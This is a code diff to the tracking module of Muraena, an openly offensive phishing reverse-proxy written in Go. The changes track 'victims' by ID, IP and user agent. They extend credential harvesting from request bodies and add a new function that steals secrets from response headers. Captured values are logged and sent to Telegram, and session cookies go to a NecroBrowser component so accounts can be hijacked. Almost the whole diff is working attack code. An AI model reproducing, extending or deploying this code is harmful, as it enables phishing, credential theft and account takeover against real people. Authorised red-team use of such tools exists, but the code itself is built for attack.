@@ -1,9 +1,10 @@
 package tracking
 
 import (
-	//"encoding/json"
+	// "encoding/json"
 	"encoding/json"
 	"fmt"
+	"net"
 	"net/http"
 	"net/url"
 	"path"
@@ -13,6 +14,7 @@ import (
 	"time"
 
 	"github.com/manifoldco/promptui"
+	"github.com/muraenateam/muraena/log"
 
 	"github.com/muraenateam/muraena/module/telegram"
 
@@ -45,15 +47,24 @@ const (
 var DisabledExtensions = strings.Split(strings.ToLower(blockExtension), ",")
 var DisabledMedia = strings.Split(strings.ToLower(blockMedia), ",")
 
+type LandingType int
+
+const (
+	LandingPath LandingType = iota
+	LandingQuery
+)
+
+// Tracker object structure
+
 // Tracker module
 type Tracker struct {
 	session.SessionModule
 
 	Enabled        bool
-	Type           string
+	Type           LandingType
 	Identifier     string
 	Header         string
-	Landing        string
+	LandingHeader  string
 	ValidatorRegex *regexp.Regexp
 	TrackerLength  int
 }
@@ -125,9 +136,18 @@ func Load(s *session.Session) (m *Tracker, err error) {
 	m = &Tracker{
 		SessionModule: session.NewSessionModule(Name, s),
 		Enabled:       s.Config.Tracking.Enabled,
-		Header:        "If-Range",            // Default HTTP Header
-		Landing:       "If-Landing-Redirect", // Default Landing HTTP Header
-		Type:          strings.ToLower(s.Config.Tracking.Type),
+		Header:        "If-Range",                  // Default HTTP Header
+		LandingHeader: "If-LandingHeader-Redirect", // Default LandingHeader HTTP Header
+		// Type:          strings.ToLower(s.Config.Tracking.Trace.Landing.Type),
+	}
+
+	switch strings.ToLower(s.Config.Tracking.Trace.Landing.Type) {
+	case "path":
+		m.Type = LandingPath
+
+	case "query":
+	default:
+		m.Type = LandingQuery
 	}
 
 	if !m.Enabled {
@@ -135,27 +155,27 @@ func Load(s *session.Session) (m *Tracker, err error) {
 		return
 	}
 
-	config := s.Config.Tracking
+	config := s.Config.Tracking.Trace
 	m.Identifier = config.Identifier
 
 	// Set tracking header
-	if s.Config.Tracking.Header != "" {
-		m.Header = s.Config.Tracking.Header
+	if s.Config.Tracking.Trace.Header != "" {
+		m.Header = s.Config.Tracking.Trace.Header
 	}
 
 	// Set landing header
-	if s.Config.Tracking.Landing != "" {
-		m.Landing = s.Config.Tracking.Landing
+	if s.Config.Tracking.Trace.Landing.Header != "" {
+		m.LandingHeader = s.Config.Tracking.Trace.Landing.Header
 	}
 
 	// Default Trace format is UUIDv4
 	m.ValidatorRegex = regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3" +
 		"}-[a-fA-F0-9]{12}$")
 
-	if config.Regex != "" {
-		m.ValidatorRegex, err = regexp.Compile(config.Regex)
+	if config.ValidatorRegex != "" {
+		m.ValidatorRegex, err = regexp.Compile(config.ValidatorRegex)
 		if err != nil {
-			m.Warning("Failed to compile tracking validator regex: %s. Falling back to UUID4.", config.Regex)
+			m.Warning("Failed to compile tracking validator regex: %s. Falling back to UUID4.", config.ValidatorRegex)
 			return
 		}
 	}
@@ -169,6 +189,10 @@ func Load(s *session.Session) (m *Tracker, err error) {
 
 // IsValid validates the tracking value
 func (t *Trace) IsValid() bool {
+	if t.ValidatorRegex == nil {
+		return false
+	}
+
 	return t.ValidatorRegex.MatchString(t.ID)
 }
 
@@ -194,7 +218,7 @@ func isDisabledMediaType(media string, disabledMedia []string) bool {
 		return false
 	}
 
-	// Media Type handling.
+	// Media LandingType handling.
 	// Prevent processing of unwanted media types
 	media = strings.TrimSpace(strings.ToLower(media))
 	for _, skip := range disabledMedia {
@@ -285,10 +309,10 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	//
 	// Tracing types: Path || Query (default)
 	//
-	if module.Type == "path" {
+	if module.Type == LandingPath {
 		tr := module.Session.Config.Tracking
 
-		pathRegex := strings.Replace(tr.Identifier, "_", "/", -1) + tr.Regex
+		pathRegex := strings.Replace(tr.Trace.Identifier, "_", "/", -1) + tr.Trace.ValidatorRegex
 		re := regexp.MustCompile(pathRegex)
 
 		match := re.FindStringSubmatch(request.URL.Path)
@@ -297,8 +321,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 		if len(match) > 0 {
 			t = module.makeTrace(match[0])
 			if t.IsValid() {
-				request.Header.Set(module.Landing, strings.ReplaceAll(request.URL.Path, t.ID, ""))
-				module.Info("setting %s header to %s", module.Landing, strings.ReplaceAll(request.URL.Path, t.ID, ""))
+				request.Header.Set(module.LandingHeader, strings.ReplaceAll(request.URL.Path, t.ID, ""))
+				module.Info("setting %s header to %s", module.LandingHeader, strings.ReplaceAll(request.URL.Path, t.ID, ""))
 				noTraces = false
 				isTrackedPath = true
 			}
@@ -351,37 +375,39 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	}
 
 	if v.ID == "" {
-
 		// Tracking IP
-		IPSource := request.RemoteAddr
-		if module.Session.Config.Tracking.IPSource != "" {
-			IPSource = request.Header.Get(module.Session.Config.Tracking.IPSource)
-		}
-
-		v := &db.Victim{
+		IPSource := GetRealAddr(request).String()
+		newVictim := &db.Victim{
 			ID:           t.ID,
 			IP:           IPSource,
 			UA:           request.UserAgent(),
-			RequestCount: 0,
+			RequestCount: 1,
 			FirstSeen:    time.Now().UTC().Format("2006-01-02 15:04:05"),
 			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
 		}
 
-		module.PushVictim(v)
+		module.PushVictim(newVictim)
 		module.Info("[+] victim: %s \n\t%s\n\t%s", tui.Bold(tui.Red(t.ID)), tui.Yellow(IPSource), tui.Yellow(request.UserAgent()))
-		//module.Debug("[%s] %s://%s%s", request.Method, request.URL.Scheme, request.Host, request.URL.Path)
+		// module.Debug("[%s] %s://%s%s", request.Method, request.URL.Scheme, request.Host, request.URL.Path)
 	}
 
-	v.RequestCount++
-	if module.Type == "path" && isTrackedPath {
-		request.URL.Path = module.Session.Config.Tracking.RedirectTo
+	if module.Type == LandingPath && isTrackedPath {
+		if module.Session.Config.Tracking.Trace.Landing.RedirectTo != "" {
+			targetURL, err := url.ParseRequestURI(module.Session.Config.Tracking.Trace.Landing.RedirectTo)
+			if err != nil {
+				log.Error("invalid redirect URL after landing path: %s", err)
+			} else {
+				request.URL = targetURL
+			}
+		}
 	}
 
 	return
 }
 
 // TrackResponse tracks an HTTP Response
-func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {
+// func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {
+func (module *Tracker) TrackResponse(response *http.Response) (t *Trace) {
 
 	// Do Not Track if not required
 	if !module.Enabled {
@@ -389,7 +415,7 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 	}
 
 	trackingFound := false
-	t := module.makeTrace("")
+	t = module.makeTrace("")
 
 	// Check cookies first to avoid replacing issues
 	for _, cookie := range response.Request.Cookies() {
@@ -404,10 +430,9 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 		// Trace not found in Cookies check If-Range (or custom defined) HTTP Headers
 		t = module.makeTrace(response.Request.Header.Get(module.Header))
 		if t.IsValid() {
-
 			cookieDomain := module.Session.Config.Proxy.Phishing
-			if module.Session.Config.Tracking.Domain != "" {
-				cookieDomain = module.Session.Config.Tracking.Domain
+			if module.Session.Config.Tracking.Trace.Domain != "" {
+				cookieDomain = module.Session.Config.Tracking.Trace.Domain
 			}
 			module.Info("Setting tracking cookie for domain: %s", cookieDomain)
 
@@ -425,15 +450,18 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 		// Reset trace
 		t = module.makeTrace("")
 
-	} else {
-		var err error
-		victim, err = t.GetVictim(t)
-		if err != nil {
-			module.Warning("Error: cannot retrieve Victim from tracker: %s", err)
-		}
 	}
+	// else {
+	//	var err error
+	//	victim, err = t.GetVictim(t)
+	//	if err != nil {
+	//		module.Warning("Error: cannot retrieve Victim from tracker: %s", err)
+	//	}
+	// }
 
-	return victim
+	// return victim
+
+	return
 }
 
 // ExtractCredentials extracts credentials from a request body and stores within a VictimCredentials object
@@ -448,8 +476,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 
 	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
 	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
-	for _, c := range t.Session.Config.Tracking.Urls.Credentials {
-
+	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
 		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
 		matched := false
 		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
@@ -459,18 +486,22 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 		}
 
 		if matched {
-			//t.Verbose("[%s] there might be credentials here.")
-			for _, p := range t.Session.Config.Tracking.Patterns {
+			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {
+
 				// Case *sensitive* matching
 				if strings.Contains(body, p.Matching) {
 					// Extract it
 					value := InnerSubstring(body, p.Start, p.End)
 					if value != "" {
+						found = true
+
+						// Decode URL-encoded values
 						mediaType := strings.ToLower(request.Header.Get("Content-Type"))
 						if strings.Contains(mediaType, "urlencoded") {
-							value, err = url.QueryUnescape(value)
-							if err != nil {
+							if v, err := url.QueryUnescape(value); err != nil {
 								t.Warning("%s", err)
+							} else {
+								value = v
 							}
 						}
 
@@ -485,10 +516,9 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 							return false, err
 						}
 
-						found = true
-
 						message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
-						t.Info("%s=%s", message, tui.Bold(tui.Red(creds.Value)))
+						// t.Debug("[+] Pattern: %v", p)
+						t.Info("%s=%s (%s)", message, tui.Bold(tui.Red(creds.Value)), request.URL.Path)
 						if tel := telegram.Self(t.Session); tel != nil {
 							tel.Send(message)
 						}
@@ -496,9 +526,79 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 				}
 			}
 
-			if found {
-				break
+			// if found {
+			//	break
+			// }
+		}
+
+	}
+
+	if found {
+		t.ShowCredentials()
+	}
+
+	return found, nil
+}
+
+// ExtractCredentialsFromResponseHeaders extracts tracking credentials from response headers.
+// It returns true if credentials are found, false otherwise.
+func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (found bool, err error) {
+
+	found = false
+	victim, err := t.GetVictim(t)
+	if err != nil {
+		t.Error("%s", err)
+		return found, err
+	}
+
+	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
+	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
+	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
+		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
+		matched := false
+		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
+			matched, _ = regexp.MatchString(c, response.Request.URL.Path)
+		} else {
+			matched = response.Request.URL.Path == c
+		}
+
+		if matched {
+			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {
+				for k, v := range response.Header {
+
+					// generate the header string:
+					// key: value
+					header := fmt.Sprintf("%s: %s", k, strings.Join(v, " "))
+
+					if strings.Contains(header, p.Matching) {
+						// Extract it
+						value := InnerSubstring(header, p.Start, p.End)
+						if value != "" {
+
+							creds := &db.VictimCredential{
+								Key:   p.Label,
+								Value: value,
+								Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
+							}
+
+							if err = creds.Store(victim.ID); err != nil {
+								return false, err
+							}
+
+							found = true
+							message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
+							t.Info("%s=%s", message, tui.Bold(tui.Red(creds.Value)))
+							if tel := telegram.Self(t.Session); tel != nil {
+								tel.Send(message)
+							}
+						}
+					}
+				}
 			}
+
+			// if found {
+			//	break
+			// }
 		}
 
 	}
@@ -514,7 +614,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
 
-	if !t.Session.Config.NecroBrowser.Enabled {
+	if !t.Session.Config.Necrobrowser.Enabled {
 		return
 	}
 
@@ -525,7 +625,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		return
 	}
 
-	for _, c := range t.Session.Config.Tracking.Urls.AuthSession {
+	for _, c := range t.Session.Config.Necrobrowser.SensitiveLocations.AuthSession {
 		if request.URL.Path == c {
 			getSession = true
 			break
@@ -553,4 +653,20 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	}
 
 	return
+}
+
+// GetRealAddr returns the IP address from an http.Request
+func GetRealAddr(r *http.Request) net.IP {
+	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
+		if parts := strings.Split(forwarded, ","); len(parts) > 0 {
+			// Intermediate nodes append, so first is the original client
+			return net.ParseIP(strings.TrimSpace(parts[0]))
+		}
+	}
+
+	addr, _, err := net.SplitHostPort(r.RemoteAddr)
+	if err == nil {
+		return net.ParseIP(addr)
+	}
+	return net.ParseIP(r.RemoteAddr)
 }
